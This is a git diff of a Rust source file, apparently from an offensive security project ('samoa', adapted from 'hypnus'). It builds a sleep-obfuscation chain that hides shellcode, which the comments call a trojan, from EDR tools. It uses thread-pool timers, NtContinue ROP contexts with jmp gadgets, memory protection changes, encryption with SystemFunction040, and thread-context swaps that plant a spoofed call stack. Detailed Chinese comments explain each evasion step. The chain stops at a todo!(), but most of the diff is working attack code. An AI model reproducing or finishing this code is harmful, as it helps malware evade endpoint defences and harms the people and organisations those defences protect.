@@ -1,6 +1,6 @@
 #![allow(unused)]
 
-//use alloc::string::String;//原项目hypnus中用于obfstr的宏展开,samoa中未使用obfstr
+//use alloc::string::String;//原项目hypnus中用于obfstr的宏展开,samoa中未使用obfstr,而是使用了error.rs中的HypnusError和steal_bail!来error handling
 
 use puerto::winapis::NT_SUCCESS;
 use spin::mutex;
@@ -8,26 +8,29 @@ use spin::mutex;
 use uwd::AsPointer;
 
 use crate::error::HypnusError::{
-    InvalidArguments, NtCreateEventFailed, NtDuplicateObjectFailed, NtWaitForSingleObjectFailed, TpAllocPoolFailed, TpAllocTimerNtSetEventFailed, TpAllocTimerRtlCaptureContextFailed, TpSetPoolStackInformationFailed,
+    InvalidArguments, NtCreateEventFailed, NtDuplicateObjectFailed, NtWaitForSingleObjectFailed,
+    TpAllocPoolFailed, TpAllocTimerNtSetEventFailed, TpAllocTimerRtlCaptureContextFailed,
+    TpSetPoolStackInformationFailed,
 };
 use crate::types::{
-    CONTEXT_FULL, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, TP_CALLBACK_ENVIRON_V3,
-    TP_POOL_STACK_INFORMATION,
+    CONTEXT_FULL, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READWRITE,
+    TP_CALLBACK_ENVIRON_V3, TP_POOL_STACK_INFORMATION,
 };
 use crate::winapis::{
-    NtCreateEvent, NtSetEvent2, NtWaitForSingleObject, TpAllocPool, TpAllocTimer, TpSetPoolMaxThreads, TpSetPoolMinThreads, TpSetPoolStackInformation, TpSetTimer,NtDuplicateObject,
+    NtCreateEvent, NtDuplicateObject, NtSetEvent2, NtWaitForSingleObject, TpAllocPool,
+    TpAllocTimer, TpSetPoolMaxThreads, TpSetPoolMinThreads, TpSetPoolStackInformation, TpSetTimer,
 };
 use crate::{debug_log, stealth_bail};
 use core::ptr::null;
 use core::task::Context;
 use core::{ffi::c_void, mem::zeroed, ptr::null_mut, time};
 
-use crate::gadget::{GadgetContext};// gadgetcontext是一个trait,其内部是fn jmp(),因为jmp没有pub,只能通过引入gadgetcontext的方式引入jmp()
-use crate::config::{Config, init_config,current_rsp};
-use crate::error::{HypnusError, Result}; // 代替源码hyonus中anyhow的Result
+use crate::config::{Config, current_rsp, init_config};
+use crate::error::{HypnusError, Result};
+use crate::gadget::GadgetContext; // gadgetcontext是一个trait,其内部是fn jmp(),因为jmp没有pub,只能通过引入gadgetcontext的方式引入jmp() // 代替源码hyonus中anyhow的Result
 
-use puerto::types::{CONTEXT, EVENT_ALL_ACCESS, EVENT_TYPE, LARGE_INTEGER,DUPLICATE_SAME_ACCESS};
-use puerto::winapis::{NtCurrentProcess,NtCurrentThread};
+use puerto::types::{CONTEXT, DUPLICATE_SAME_ACCESS, EVENT_ALL_ACCESS, EVENT_TYPE, LARGE_INTEGER};
+use puerto::winapis::{NtCurrentProcess, NtCurrentThread};
 /// Enumeration of supported memory obfuscation strategies
 ///
 /// 用于指定休眠混淆的底层调度方式(线程池/APC),并用于fiber入口处路由执行框架;无论Timer还是Foliage,核心主载荷的加密方式都是写死的(ROP链中的SystemFunction040)
@@ -45,14 +48,16 @@ pub enum Obfuscation {
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 // 代表透明内存布局(编译时,把该类型当作其内部的类型对待):强制ObfMode结构体内部布局和定义时的内部字段完全一致(物理内存中的大小(等于u32的4字节大小)/对齐(等于u32的4字节对齐)/abi(如一个函数接收这个类型的参数时,与接收一个u32没有区别.如果没有这个属性,编译器可能把这个结构体通过栈/指针来隐式传递) 与u32一致,不能有多余padding),避免rustc的优化(默认是#[repr(transparent)]).使ObfMode中u32的值和物理属性与u32完全一致.
 #[repr(transparent)]
-/// 元组结构体(包含一个匿名字段/成员)
-/// 是Rust中的NewType模式:即用结构体包装一个已有类型以提供类型安全
+/// 元组结构体(包含一个匿名字段/成员);
+/// 是Rust中的NewType模式:即用结构体包装一个已有类型以提供类型安全;
 /// 该结构体用于表示:混淆中是否开启额外的内存操作特权(是私有堆独立加密/主载荷的rwx权限妥协).该结构体ObfMode不改变使用的加密方式(SystemFunction040),只更改内存权限
 pub struct ObfMode(pub u32);
 
 /// 后续会手动传入timer!/wait!/Hypnus结构体.在执行时,会通过这个值决定如何操作内存加密
 impl ObfMode {
-    // Rust中,在impl中为结构体定义附属于该类型的常量
+    // Rust中,在impl中为结构体定义附属于该类型的常量,称为关联常量(非常Idiomatic Rust的设计模式):以ObfMode::Heap的形式使用,且其命名空间被锁定在ObfMode::空间中,不会与rust prelude的Option::None发生冲突.如果不在impl块中定义pub const None: ObfMode = ObfMode(0b0000);则会污染当前模块的命名空间.
+    // 这么写的好处:1. 模拟enum类型,同时保持 #[repr(transparent)]的底层物理特性.如果使用enum会有tag标识. 2. 高内聚性encapsulation:符合面向对象驱动的设计思想,None\Heap\Rwx是ObfMode类型的合法预设值,将它们和ObfMode绑在一起,提升代码可读性
+    // 这三个常量的生命周期:在Rust中,只要是const关键字定义的常量,无论在什么地方,其生命周期和内存行为都是一致的. 1. const在编译时会被直接内联到所有调用它的地方;在运行时ObfMode::None没有一般变量的堆栈生命周期,不占用运行时的变量生存期,不会在程序运行期间被释放/销毁 2. 若取其引用,自动提到'static,rustc将该常量的值放入程序只读数据段.rdata
     // 这里的None是一个全局公开常量,其内部的值是ObfMode(0b0000);借助#[repr(transparent)],其本质是一个u32,但在Rust类型系统角度,它是一个新的ObfMode类型.
     // None不是rust关键字(是core::option::Option::None).且控制在impl ObfMode命名空间中,不会和预导入的None冲突
     pub const None: Self = ObfMode(0b0000);
@@ -104,7 +109,6 @@ struct Hypnus {
 
 impl Hypnus {
     /// create a new Hypnus structure
-
     #[inline]
     fn new(base: u64, size: u64, time: u64, mode: ObfMode) -> Result<Self> {
         if base == 0 || size == 0 || time == 0 {
@@ -121,7 +125,7 @@ impl Hypnus {
         })
     }
 
-    /// performs memory obfuscation using a thread-pool timer sequence
+    /// performs memory obfuscation using a thread-pool timer sequence,线程池和事件组合
     fn timer(&mut self) -> Result<()> {
         unsafe {
             // Determine if heap obfuscation and RWX memory should be use:heap是ObfMode字段的值.这里代表使用堆加密的混淆方式
@@ -244,7 +248,7 @@ impl Hypnus {
             // 本项目作用:主线程100ms后触发定时器,主线程调用NtWaitForSingleObject挂起自身.定时器触发后,内核唤醒私有线程池中唯一的worker执行trampoline,在trampoline中引导cpu执行ntdll!RtlCaptureContext将该worker此刻寄存器状态写入ctx_init.后续以此为基础设置10个ctx
             TpSetTimer(
                 // 输出参数,由tpalloctimer产生,在调用TpSetTimer前,已经被TpAllocTimer填入
-                timer_ctx, // 唤醒时刻
+                timer_ctx,  // 唤醒时刻
                 &mut delay, // 周期msperiod,0代表是one-shot单次触发任务;
                 0,
                 // msWindowLength - 时间窗口:允许系统延迟执行的宽限期.0代表只要倒计时一归零，必须立刻发送唤醒信号(实际执行中受硬件时钟终端频率限制(一般15.6ms),除非使用timeBeginPeriod修改系统时钟频率)
@@ -267,41 +271,45 @@ impl Hypnus {
                 events[0],
                 &mut env,
             );
-if !NT_SUCCESS(status) {
-    stealth_bail!(TpAllocTimerNtSetEventFailed,"TpAllocTimer [NtSetEvent] Failed")
-}
+            if !NT_SUCCESS(status) {
+                stealth_bail!(
+                    TpAllocTimerNtSetEventFailed,
+                    "TpAllocTimer [NtSetEvent] Failed"
+                )
+            }
 
-// 将主线程(当前线程)陷入休眠(将events[0]绑定到NtWaitForSingleObject),直到指定的events[0]信号出现,才继续执行主线程
-// Wait for context capture to complete
-status=NtWaitForSingleObject(
-    // 等待的事件对象句柄
-    events[0], 
-    // 是否可被其他中断唤醒
-    0,
-    // 等待时长(这里代表事件信号出现就立即执行)
-    null_mut());
-if !NT_SUCCESS(status) {
-    stealth_bail!(NtWaitForSingleObjectFailed,"NtWaitForSingleObject Failed")
-}
+            // 将主线程(当前线程)陷入休眠(将events[0]绑定到NtWaitForSingleObject),直到指定的events[0]信号出现,才继续执行主线程
+            // Wait for context capture to complete
+            status = NtWaitForSingleObject(
+                // 等待的事件对象句柄
+                events[0],
+                // 是否可被其他中断唤醒
+                0,
+                // 等待时长(这里代表事件信号出现就立即执行)
+                null_mut(),
+            );
+            if !NT_SUCCESS(status) {
+                stealth_bail!(NtWaitForSingleObjectFailed, "NtWaitForSingleObject Failed")
+            }
 
-// 主线程陷入休眠,开始构建十个ctx
-// Build multi-step spoofed CONTEXT chain
+            // 主线程陷入休眠,开始构建十个ctx
+            // Build multi-step spoofed CONTEXT chain
             // 每个ctx_init都是cpu的瞬时寄存器数据,用于加载到NtContinue,通过Ntcontinue构建config,然后修改config执行指定的函数.
             // 根据上面获取的快照ctx_init,伪造10份.CONTEXT derive copy,这里在内存(栈)执行了10此memcpy.即创建了10个一样的执行环境,每个都有该线程池的线程的原始寄存器状态
-let mut ctxs = [ctx_init;10];
-// 将10个ctx的rax置为NtContinue的地址,然后将栈向低地址扩张8个字节,用来在rsp指向的空间中保存伪造的返回地址(ROP链中下一跳的地址).防止原栈顶数据被覆盖
-// 因为ASLR的存在,ntcontinue的va是动态随机的.因此不能在编译阶段将其地址硬编码在静态的机器码中.所以要动态解析其地址并存入ctx.rax中,之后通过trampoline(cfg.callback)读取并跳转
-  for ctx in &mut ctxs {
+            let mut ctxs = [ctx_init; 10];
+            // 将10个ctx的rax置为NtContinue的地址,然后将栈向低地址扩张8个字节,用来在rsp指向的空间中保存伪造的返回地址(ROP链中下一跳的地址).防止原栈顶数据被覆盖
+            // 因为ASLR的存在,ntcontinue的va是动态随机的.因此不能在编译阶段将其地址硬编码在静态的机器码中.所以要动态解析其地址并存入ctx.rax中,之后通过trampoline(cfg.callback)读取并跳转
+            for ctx in &mut ctxs {
                 // NtContinue接收一个context,强迫cpu变成context描述的状态
                 ctx.Rax = self.cfg.nt_continue.as_u64();
                 ctx.Rsp -= 8;
             }
 
- // Duplicate thread handle for context manipulation
- // NtCurrentThread() （伪句柄  -2)代表当前工作线程.t_thread通过NtDuplicateObject获取主线程的绝对真实句柄.锁定这个绝对句柄一定也只能指向主线程
+            // Duplicate thread handle for context manipulation
+            // NtCurrentThread() （伪句柄  -2)代表当前工作线程.t_thread通过NtDuplicateObject获取主线程的绝对真实句柄.锁定这个绝对句柄一定也只能指向主线程
             let mut h_thread = null_mut();
 
-// NtDuplicateObject,内核提供的handle克隆api.在内核句柄表(handle table)中,创建新索引条目,该条目指向一个存在的内核对象.可以跨进程克隆句柄,可以在同一进程中将受限/临时的句柄转为永久/有完全访问权限的实体句柄
+            // NtDuplicateObject,内核提供的handle克隆api.在内核句柄表(handle table)中,创建新索引条目,该条目指向一个存在的内核对象.可以跨进程克隆句柄,可以在同一进程中将受限/临时的句柄转为永久/有完全访问权限的实体句柄
             // 其核心功能是将源进程表中的一个对象句柄索引，在目标进程（或同进程）的句柄表中创建一个新的有效条目，并根据权限掩码（ACCESS_MASK）赋予其相应的访问能力
             // 在该项目中，此函数的作用是将当前线程的“伪句柄（Pseudo-handle）”转换为具备完整访问权限的“真实内核对象句柄”，以解决多线程异步环境下的定位冲突.这里将伪句柄(-2)传给ctx.rcx传给,
             status = NtDuplicateObject(
@@ -321,23 +329,81 @@ let mut ctxs = [ctx_init;10];
                 DUPLICATE_SAME_ACCESS,
             );
             if !NT_SUCCESS(status) {
-                stealth_bail!(NtDuplicateObjectFailed,"NtDuplicateObject Failed")
+                stealth_bail!(NtDuplicateObjectFailed, "NtDuplicateObject Failed")
             }
 
             // 调用config.rs中的spoof_context(),构建伪造的回溯链
-// Base CONTEXT for spoofing
+            // Base CONTEXT for spoofing
             ctx_init.Rsp = current_rsp();
             // spoof_context不是针对某个函数/payload的伪造栈,而是伪造了整个回溯链.这里ctx_init提供当前栈的所有寄存器状态
             // EDR回溯的起点是rsp指向的栈槽位,即使rip里是payload地址,也不影响伪造栈.即,这里从payload之后开始一直伪装到回溯的根部
             let mut ctx_spoof = self.cfg.stack.spoof_context(self.cfg, ctx_init);
 
-            // 开始构造10个ctx
+            // 开始构造10个ctx(类型是CONTEXT):在jmp()中,找到合适的jmp <reg>,然后将gadget(jmp <reg>)赋给ctx.rip,将敏感函数地址存入gadget的通用寄存器中.之后用每个ctx的rcx/rdx/r8/r9用来传递被调用的敏感api需要的参数.效果是在ntcontinue执行这个gadget时通过jmp <reg>执行了敏感函数
             // The chain will wait until `event` is signaled
-            ctxs[0].jmp(self.cfg,self.cfg.nt_wait_for_single.into());
+            //
+            ctxs[0].jmp(self.cfg, self.cfg.nt_wait_for_single.into());
+            // 该函数有3个参数
+            // 将events[1]和NtWaitForSingleObject绑定:只有events[1]发信号这个绑定的函数才会执行
+            ctxs[0].Rcx = events[1] as u64;
+            ctxs[0].Rdx = 0;
+            ctxs[0].R8 = 0;
+
+            // Temporary RW access:将原本rx的内存属性转为rw,用于写入
+            // 设置ctxs[1]:ROP链中改变shellcode内存属性的环节
+            let mut old_protect = 0u32;
+            // base和size本身就是指针(u64),这里遮蔽为可变指针
+            // NtProtectVirtualMemory要求传入指针的指针,且可能因为内存对齐对内存进行修改.
+            // 因此这里拷贝一份木马的内存,用于后面操作木马的内存?
+            let (mut base, mut size) = (self.base, self.size);
+            ctxs[1].jmp(self.cfg, self.cfg.nt_protect_virtual_memory.into());
+            ctxs[1].Rcx = NtCurrentProcess() as u64;
+            // 注意下面的base和size通过as_u64()将各自
+            // base.as_u64是否从下从mut self 到&mut self的转换?从而通过该函数得到指向base(u64类型,其本身就是一个指针)的指针?
+            ctxs[1].Rdx = base.as_u64();
+            ctxs[1].R8 = size.as_u64();
+            // shellcode通常是rx,但下一步需要XOR加密,需要暂时改为rw
+            ctxs[1].R9 = PAGE_READWRITE as u64;
+            // NtprotectVirtualMempry有5个参数,这里只配置了4个,第五个参数后面通过((ctxs[1].Rsp + 0x28) as *mut u64).write(old_protect.as_u64())在栈上写入第五个参数的代码.为啥这里不直接写完第五个参数呢?
+
+            // ctxs[2]:Encrypt region:利用系统自带加密函数SystemFunction040对shellcode加密
+            ctxs[2].jmp(self.cfg, self.cfg.system_function040.into());
+            ctxs[2].Rcx = base;
+            ctxs[2].Rdx = size; // 该 native api要求此值必须是8字节对齐,这里是否需要进行检查?
+            // 对应RTL_ENCRYPT_OPTION_SAME_PROCESS:加密后的数据仅能在当前进程内解密
+            ctxs[2].R8 = 0;
 
 
+            //ctxs[3]:backup context备份当前线程状态
+            // 作用:
+            let mut ctx_backup
+             = CONTEXT{ContextFlags:CONTEXT_FULL,
+            ..Default::default()};
+         // jmp函数将ctxs[3].rip指向一个系统合法(三个dll中)的gadget(jmp <reg>),根据找到的reg将target函数NtThreadContext的地址放进去.该函数读取指定线程的cpu寄存器快照;必须使用NtThreadContext,这时唯一能获取包括rsp/eflags(状态位)在内,能够完整描述一个线程状态的官方接口
+         (&mut ctxs[3]).jmp(self.cfg,self.cfg.nt_get_context_thread.into());
+         ctxs[3].Rcx=h_thread as u64;
+         ctxs[3].Rdx=ctx_backup.as_u64();
 
 
+         // ctxs[4]:Inject spoofed context:
+         // NtSetContextThread是SetThreadContext的底层系统调用:允许一个进程强制重写指定线程的cpu寄存器状态.内核强行修改cpu硬件层面的寄存器值,使得线程在下一次cpu时钟周期恢复执行时,直接变为提供的新状态
+         ctxs[4].jmp(self.cfg, self.cfg.nt_set_context_thread.into());
+         ctxs[4].Rcx=h_thread as u64;
+         ctxs[4].Rdx=ctx_spoof.as_u64();
+
+         // sleep:将当前线程陷入休眠
+         // shellcode的内存已加密(ctxs[2]),当前线程的栈帧已伪造(ctxs[4]),线程处于合法等待状态
+         // 此后当前线程带着伪造的栈帧运行.下面调用WaitForSingleObject,当前的stack Unwind是ctxs[4]伪造好的 
+        ctxs[5].jmp(self.cfg,self.cfg.wait_for_single.into());
+        // WaitForSingleObject的第一个参数是陷入休眠的线程handle,这里置为当前线程.让线程等待自己结束,这样方式来陷入休眠(通常线程只有在terminate结束时才变为有信号状态,让线程等待一个在休眠期间永远不会发生的信号,这样强制利用超时机制达到sleep.WaitForSingleObject是系统常见行为,而sleep是edr检测重点).
+        ctxs[5].Rcx=h_thread as u64;
+        // 休眠时间(ms)
+        ctxs[5].Rdx=self.time * 1000;
+        // 对R8清零
+        ctxs[5].R8=0;
+
+
+        // ctxs[6]
 
 
 
@@ -345,6 +411,20 @@ let mut ctxs = [ctx_init;10];
 
             todo!()
         }
+    }
+}
+
+/// converts self to a u64 that representing the pointer value
+///
+trait Asu64 {
+    fn as_u64(&mut self) -> u64;
+}
+
+impl<T> Asu64 for T {
+    fn as_u64(&mut self) -> u64 {
+        // self as *mut _ :从self(&mut T)转为raw pointer
+        // as *mut c_void:转为符合c 的接口标准(ffi)
+        self as *mut _ as *mut c_void as u64
     }
 }
 
@@ -367,7 +447,7 @@ let mut ctxs = [ctx_init;10];
 // 但是后续的wait模式(使用TpAllocWait注册,其回调的参数要符合PTP_WAIT_CALLBACK(等待事件回调函数原型),接收4个参数).为了方便后续复用,将ntsetevent2直接设计为4个参数
 // 在混淆逻辑运行时,调用NtSetEvent2的是win线程池的工作线程(worker thread).当线程池触发定时器跳到NtSetEvent2时,工作线程内部会执行给寄存器赋值操作
 // 第一个定时器使用trampolie 第二个定时器使用wrapper函数:核心原因是 RtlCaptureContext本身就是捕获当前寄存器状态的,如果使用wrapper RtlCaptureContext的方式,明显会由于proluge 和 尾声 破坏当前寄存器状态.
-// 而tampoline(mov rcx,rdx xor rdx,rdx jmpQWORD PTR [rcx])其物理上直接jmp到RtlCaptureContext. 
+// 而tampoline(mov rcx,rdx xor rdx,rdx jmpQWORD PTR [rcx])其物理上直接jmp到RtlCaptureContext.
 // 它没有proluge:没有修改栈的指令,栈状态干净;使用jmp而不是call 无条件跳转不向栈压入返回地址.
 // 在cpu看来 和线程池内核调度器直接调用一样,从而抓到完美的,没有代码痕迹的工作线程快照.
 // 而 NtSetEvent 这个win api 根本不关心调用者的栈和寄存器状态,它无所谓被包装函数修改
